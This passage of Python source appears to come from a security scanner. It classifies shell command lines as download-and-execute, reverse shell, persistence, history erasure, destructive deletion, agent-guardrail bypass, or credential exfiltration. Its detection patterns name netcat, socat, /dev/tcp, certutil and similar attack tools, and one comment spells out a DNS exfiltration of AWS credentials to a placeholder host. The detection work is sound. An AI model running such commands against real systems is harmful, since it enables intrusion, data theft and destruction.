    if (program in ("base64", "base32")):
        return command.option("-d", "-D", "--decode")

    if (program == "xxd"):
        return command.option("-r")

    if (program == "openssl"):
        return command.option("-d") or "-d" in command.args

    return program == "uudecode"


def _risky(commands: tuple) -> list:  # pylint: disable=too-many-branches,too-many-statements
    found = []

    def add(name: str, technique: str, command: shell.Command):
        if (not any(item[0] == name and item[2] == command.raw for item in found)):
            found.append((name, technique, command.raw))

    downloaded = {}

    for command in commands:
        program = command.program
        line = shell.pipeline_of(commands, command)
        upstream = line[:command.position] if command.position < len(line) else []

        # Download and run, decode and run: a pipe from the source to something that runs its input.
        if (_reads_program_from_stdin(command) and upstream):
            between = upstream[1:]

            if (all(other.program in PASS_THROUGH or _is_decoder(other) or other.program in FETCHERS
                    for other in between)):
                if (any(other.program in FETCHERS for other in upstream)):
                    add("download_and_execute", "T1105", command if len(command.raw) > 8 else upstream[0])

                if (any(_is_decoder(other) for other in upstream)):
                    add("decode_and_execute", "T1027", command)

        # ... or a substitution that is the whole program: `sh -c "$(curl ...)"`, `bash <(curl ...)`, `eval "$(...)"`.
        if (command.via in ("-c$(", "eval$(") or
            (command.via == "<(" and command.parent >= 0 and commands[command.parent].program in STDIN_PROGRAMS)):
            if (program in FETCHERS):
                add("download_and_execute", "T1105", commands[command.parent])
            elif (_is_decoder(command)):
                add("decode_and_execute", "T1027", commands[command.parent])

        # ... or a file fetched and then run in the same line.
        if (program in ("curl", "wget")):
            for name in [*command.value("-o", "--output", "-O", "--output-document")]:
                downloaded[name.removeprefix("./")] = command
        elif (downloaded and command.argv):
            invoked = command.argv[len(command.argv) - len(command.args) - 1].removeprefix("./")
            script = next((word.removeprefix("./") for word in command.operands[:1]), "")

            if (invoked in downloaded or (program in STDIN_PROGRAMS and script in downloaded)):
                add("download_and_execute", "T1105", command)

        if (command.code):
            if (CODE_FETCH.search(command.code) and CODE_EXEC.search(command.code)):
                add("download_and_execute", "T1105", command)

            if (CODE_DECODE.search(command.code) and CODE_EXEC.search(command.code)):
                add("decode_and_execute", "T1027", command)

            if (CODE_SOCKET_SHELL.search(command.code)):
                add("reverse_shell", "T1059", command)

        if (program in ("pwsh", "powershell")
                and any(word.lower() in ("-enc", "-encodedcommand", "-e", "-ec") for word in command.args[:-1])):
            add("decode_and_execute", "T1027", command)

        if (program == "certutil" and any("urlcache" in word.lower() for word in command.args)
                or program == "bitsadmin" and any(word.lower() == "/transfer" for word in command.args)
                or program in ("mshta", "regsvr32") and any("http" in word.lower() for word in command.args)):
            add("download_and_execute", "T1105", command)

        # A reverse shell: a shell bound to a socket, by redirection or by a tool made for it.
        sockets = [DEV_SOCKET.match(target) for (target, _) in command.writes]
        remote = [match for match in sockets if match and match.group(1).lower() not in LOOPBACK]

        if (remote and (program in shell.SHELLS or program in ("exec", "") or "<>" in command.reads)):
            add("reverse_shell", "T1059.004", command)

        if (program in ("nc", "ncat", "netcat") and (command.option("-e", "-c", "--exec", "--sh-exec"))):
            add("reverse_shell", "T1059.004", command)

        if (program == "socat" and any(re.search(r"(?i)\b(?:exec|system):", word) for word in command.args)):
            add("reverse_shell", "T1059.004", command)

        if (program in shell.SHELLS and command.option("-i")
                and any(other.program in ("nc", "ncat", "netcat", "telnet") for other in line)):
            add("reverse_shell", "T1059.004", command)

        # Persistence: a write to where the system or the shell will run it again.
        for target in _targets_written(command):
            if (program in ("rm", "shred", "unlink", "truncate")):
                continue

            name = target.replace("\\", "/").rsplit("/", 1)[-1]

            if (name in PROFILE_FILES):
                written = " ".join(command.operands) if program in ("echo", "printf") else command.heredoc
                routine = bool(written) and all(
                    PROFILE_ROUTINE.match(line) for line in written.splitlines() if line.strip())
                add("shell_profile_change" if routine else "shell_profile_persistence", "T1546.004", command)

            for (kind, technique, pattern) in PERSISTENCE_PATHS:
                if (pattern.search(target)):
                    add(kind, technique, command)

        if (program == "crontab" and not command.option("-l", "-r") and (command.operands or command.position > 0)):
            add("scheduled_persistence", "T1053.003", command)

        if (program == "launchctl" and command.args[:1] in (["load"], ["bootstrap"])
                or program == "schtasks" and any(word.lower() == "/create" for word in command.args)):
            add("scheduled_persistence", "T1053", command)

        if (program == "reg" and command.args[:1] and command.args[0].lower() == "add" and any(
                re.search(r"(?i)currentversion\\run(?:once)?$|\\winlogon$|image file execution options", word)
                for word in command.args)):
            add("registry_run_key_persistence", "T1547.001", command)

        if (program == "systemctl" and "enable" in command.operands):
            add("service_enable", "T1543.002", command)

        # Erasing the shell's history.
        history_files = [target for target in _targets_written(command) if target.endswith("_history")]

        if (program == "unset" and "HISTFILE" in command.args or command.assignments.get("HISTFILE") == "/dev/null"
                or command.assignments.get("HISTSIZE") == "0"
                or program == "export" and any(word in ("HISTFILE=/dev/null", "HISTSIZE=0") for word in command.args)
                or program == "set" and command.args[:2] == ["+o", "history"]
                or program == "history" and command.option("-c") or history_files):
            add("history_tampering", "T1070.003", command)

    return found


def _scoped(default: str, words) -> str:
    """`default`, raised to high where the command names production and lowered to low where it names scratch."""
    text = " ".join(words)

    if (PRODUCTION_SCOPE.search(text)):
        return "high"

    return "low" if SCRATCH_SCOPE.search(text) else default


def _in_order(words: list, sequence: tuple) -> bool:
    """Whether `sequence` is found in order among `words`, as `compute instances delete` is in a gcloud line."""
    position = 0

    for word in words:
        if (word == sequence[position]):
            position += 1

            if (position == len(sequence)):
                return True

    return False


def _destructive(commands: tuple) -> list:  # pylint: disable=too-many-branches,too-many-statements,too-many-locals
    found = []

    def add(name: str, severity: str, command: shell.Command):
        if (not any(item[0] == name and item[2] == command.raw for item in found)):
            found.append((name, severity, command.raw))

    for command in commands:
        program = command.program
        args = command.args
        lowered = [word.lower() for word in args]
        plain = [word for word in args if not word.startswith("-")]

        if (program == "rm" and (command.option("-r", "-R", "--recursive") or "--no-preserve-root" in args)):
            if ("--no-preserve-root" in args or any(ROOTISH.match(word) for word in command.operands)):
                add("recursive_delete", "high", command)
        elif (program == "find" and command.operands and ROOTISH.match(command.operands[0])
              and ("-delete" in args or ("-exec" in args and "rm" in args))
              and not any(word in FIND_FILTERS for word in args)):
            # `find . -name '*.pyc' -delete` removes what it names; with no test at all it removes everything.
            add("recursive_delete", "high", command)
        elif (program in ("rd", "rmdir") and "/s" in lowered or program in ("del", "erase") and "/s" in lowered
              or program in ("remove-item", "ri", "rm") and "-recurse" in lowered):
            if (any(ROOTISH.match(word.strip("'\"")) for word in args)):
                add("recursive_delete", "high", command)
        elif (program == "git" and args[:1] == ["push"]):
            forced = any(
                word in ("--force", "-f",
                         "--mirror") or (word.startswith("-") and not word.startswith("--") and "f" in word[1:])
                for word in args[1:])
            refs = [word for word in args[1:] if not word.startswith("-")][1:]
            plus = [word for word in refs if word.startswith("+")]
            deleting = "--delete" in args or "-d" in args
            deleted = refs if deleting else [word[1:] for word in refs if word.startswith(":") and len(word) > 1]

            if (forced or plus):
                protected = (not refs or "--all" in args or "--mirror" in args
                             or any(PROTECTED_BRANCH.search(word) for word in refs))
                add("force_push", "high" if protected else "medium", command)

            if (deleted):
                add("remote_branch_delete",
                    "high" if any(PROTECTED_BRANCH.search(word) for word in deleted) else "medium",
                    command)
        elif (program in ("terraform", "tofu", "terragrunt")):
            verb = plain[0] if plain else ""

            # `plan -destroy` shows what a destroy would do and changes nothing.
            if (verb == "destroy" or (verb == "apply" and "-destroy" in args)):
                add("infrastructure_destroy", _scoped("high", args), command)
        elif (program == "pulumi" and plain[:1] == ["destroy"] or program == "gh" and plain[:2] == ["repo", "delete"]
              or program == "aws" and plain[:2] == ["cloudformation", "delete-stack"]
              or program == "gcloud" and plain[:2] == ["projects", "delete"]
              or program == "az" and plain[:2] == ["group", "delete"] or program == "cdk" and plain[:1] == ["destroy"]):
            add("infrastructure_destroy", _scoped("high", args), command)
        elif (program == "aws" and plain[:1] == ["s3"] and (plain[1:2] == ["rb"] or
                                                            (plain[1:2] == ["rm"] and "--recursive" in args))
              or program == "gsutil" and "rm" in args and any(word in ("-r", "-R", "-rf") for word in args)
              or program == "gcloud" and plain[:2] == ["storage", "rm"] and any(word in ("-r", "--recursive")
                                                                                for word in args)
              or program == "az" and plain[:1] == ["storage"] and any(word.startswith("delete") for word in plain)):
            add("cloud_storage_delete", _scoped("high", args), command)
        elif (program in CLOUD_DELETES and any(_in_order(plain, sequence) for sequence in CLOUD_DELETES[program])):
            add("cloud_resource_delete", _scoped("high", args), command)
        elif (program in ("kubectl", "oc")):
            operands = _operands(command, KUBECTL_VALUE_OPTIONS)

            if (operands[:1] == ["delete"]):
                kinds = {kind.split("/", 1)[0].lower() for kind in operands[1:2] for kind in kind.split(",")}
                everything = "--all" in args or "--all-namespaces" in args or "-A" in args

                if (kinds & KUBECTL_BROAD_KINDS or everything):
                    add("cluster_delete", _scoped("high", args), command)
                elif (kinds & KUBECTL_WORKLOAD_KINDS):
                    add("cluster_delete", _scoped("medium", args), command)
        elif (program == "helm" and plain[:1] in (["uninstall"], ["delete"])):
            add("cluster_delete", _scoped("medium", args), command)
        elif (program == "dd" and any(re.match(r"of=/dev/(?:sd|nvme|hd|vd|disk|mmcblk)", word) for word in args)
              or program.startswith("mkfs") or program in ("chmod", "chown") and command.option("-R")
              and any(ROOTISH.match(word) and word not in (".", "./", "*") for word in command.operands)):
            add("disk_destruction", "high", command)
        elif (program == "dropdb"):
            add("drop_database_object", _scoped("high", args), command)
        elif (program in ("redis-cli", "valkey-cli") and any(word.upper() in ("FLUSHALL", "FLUSHDB") for word in args)):
            add("data_store_flush", _scoped("high", args), command)

        if (program in DATABASE_CLIENTS):
            fed = command.heredoc or command.herestring
            line = shell.pipeline_of(commands, command)
            producer = line[command.position - 1] if 0 < command.position <= len(line) else None

            if (producer is not None and producer.program in ("echo", "printf", "cat")):
                fed = fed or " ".join(producer.operands) or producer.heredoc

            if (any(SQL_DESTRUCTION.search(word) for word in args) or SQL_DESTRUCTION.search(fed or "")):
                add("drop_database_object", _scoped("high", [*args, fed or ""]), command)

    return found


def _agent_configuration(commands: tuple) -> tuple:
    writes = []
    registrations = []
    flags = []

    for command in commands:
        program = command.program

        for target in _targets_written(command):
            if (AGENT_CONFIG_PATH.search(target.strip("'\""))):
                writes.append((target, command.raw))

        if (command.code and CODE_WRITE.search(command.code)):
            for word in re.findall(r"[\w./\\~-]{4,256}", command.code):
                if (AGENT_CONFIG_PATH.search(word)):
                    writes.append((word, command.raw))

        if (program in AGENT_CLIS and command.args[:1] == ["mcp"] and command.args[1:2] and command.args[1].startswith(
            ("add", "install"))) or (program in ("code", "code-insiders") and "--add-mcp" in command.args):
            registrations.append(command.raw)

        for flag in (*GUARDRAIL_FLAGS, *CLI_GUARDRAIL_FLAGS.get(program, ())):
            if (flag in command.args):
                flags.append((flag, command.raw))

        if (program in AGENT_CLIS):
            for (option, value) in CLI_GUARDRAIL_VALUES:
                given = [word.lower() for word in command.value(option)]
                given.extend(word.split("=", 1)[1].lower() for word in command.args if word.startswith(option + "="))

                if (value in given):
                    flags.append((f"{option} {value}", command.raw))

    return (tuple(dict.fromkeys(writes)), tuple(dict.fromkeys(registrations)), tuple(dict.fromkeys(flags)))


def _flows(commands: tuple, reads: dict, egress: dict) -> list:
    """Where one line reads a credential and carries it to the network: by pipe, upload, substitution or variable."""
    found = []
    tainted = set()
    sourced = False

    for (index, command) in enumerate(commands):
        # A variable assigned from a credential, or an environment file sourced, taints what uses it later.
        children = [child for (child, other) in enumerate(commands) if other.parent == index and other.via == "$("]

        if (command.assignments and any(child in reads for child in children)):
            tainted.update(command.assignments)

        # `for line in $(base64 ~/.aws/credentials); do dig $line.x.example.net; done`
        if (command.program == "for" and command.args[:1] and any(child in reads for child in children)):
            tainted.add(command.args[0])

        if (command.program in ("source", ".") and index in reads):
            sourced = True

        for item in egress.get(index, []):
            line = shell.pipeline_of(commands, command)
            upstream = [commands.index(other) for other in line[:command.position]] if command.position else []
            what = None

            if (index in reads and command.program not in ("ssh", )):
                what = reads[index]  # the network command itself takes the secret: `curl -d @path`, `scp path host:`
            elif (any(other in reads for other in upstream)):
                what = next(reads[other] for other in upstream if other in reads)
            elif (any(child in reads for child in children)):
                what = next(reads[child] for child in children if child in reads)
            elif (tainted and any(re.search(rf"\$\{{?{re.escape(name)}\b", command.raw) for name in tainted)):
                what = ["(a variable holding a credential)"]
            elif (sourced and re.search(r"\$\{?[A-Za-z_]", command.raw)):
                what = ["(a variable from a sourced environment file)"]

            if (what):
                found.append((", ".join(what), item.host, command.raw))

    return found


@functools.lru_cache(maxsize=4096)
def facts(command_line: str) -> Facts:
    """Everything the hunts ask of one command line. Never raises."""
    commands = shell.parse(command_line)

    if (not commands):
        return Facts()

    reads = {}
    egress = {}

    for (index, command) in enumerate(commands):
        line = shell.pipeline_of(commands, command)
        found = _secrets_read(command)

        if (found):
            reads[index] = found

        reached = _egress_of(command, command.position > 0 and bool(line))

        if (reached):
            egress[index] = reached

    (writes, registrations, flags) = _agent_configuration(commands)
    flows = _flows(commands, reads, egress)
    flowing = {host for (_, host, _) in flows}
    reached = []

    for items in egress.values():
        for item in items:
            reached.append(dataclasses.replace(item, sends=item.sends or item.host in flowing))

    return Facts(risky=tuple(_risky(commands)),
                 destructive=tuple(_destructive(commands)),
                 egress=tuple(dict.fromkeys(reached)),
                 secret_reads=tuple((what, commands[index].raw) for (index, items) in reads.items() for what in items),
                 secret_flow=tuple(flows),
                 config_writes=writes,
                 mcp_registrations=registrations,
                 guardrail_flags=flags,
                 programs=frozenset(command.program for command in commands if command.program),
                 uncertain=any(command.uncertain for command in commands))
